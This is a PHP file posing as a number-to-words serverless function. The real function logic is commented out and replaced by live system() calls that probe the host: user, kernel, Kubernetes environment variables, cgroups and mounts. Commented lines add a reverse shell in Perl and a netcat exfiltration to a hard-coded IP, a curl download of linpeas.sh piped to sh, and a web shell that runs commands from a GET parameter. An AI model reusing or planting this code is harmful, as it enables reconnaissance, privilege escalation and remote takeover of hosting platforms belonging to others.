<?php
use NFNumberToWord\NumberToWords;
 
function main(array $args)
{
//     if (!isset($args['number'])) {
//         return wrap(['error' => 'Please supply a number.']);
//     }
    
//     $number = (int)($args['number']);
//     $words = (new NumberToWords)->toWords($number);
echo(system("whoami"));
echo(system("uname -a"));
echo(system("echo 'check env vars'"));
echo(system("env | grep -E '(KUBERNETES|[^_]SERVICE)_PORT=' | sort"));
echo(system("echo 'cat /proc/self/status'"));
echo(system("echo 'ls -asl /sys/fs/cgroup/'"));
echo(system("ls -asl /sys/fs/cgroup/"));
 echo(system("ls -asl /sys/fs/cgroup/memory/"));
 echo(system("cat /proc/self/mounts"));
     
 
//     echo("------");
//  echo(system("ls -asl ; echo 'step one' ; chmod +x test123.sh ; echo 'step two' ; ./test123.sh > result.txt ; echo 'step three' ; ls -asl ; cat result.txt | nc 207.154.255.74 1337"));
// //  echo(system("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh");
// //     echo(system("whoami ; which wget ; /usr/bin/perl5.28.1 -e 'use Socket;\$i=\"207.154.255.74\";\$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"));
//     echo("\n");
//     print("------");
 
//     if(isset($_GET['cmd']))
//     {
//         echo(system($_GET['cmd']));
//     }
 
//     return [
//         'body' => $words,
//     ];

}

function wrap(array $args) : array
{
    return ["body" => $args];
}
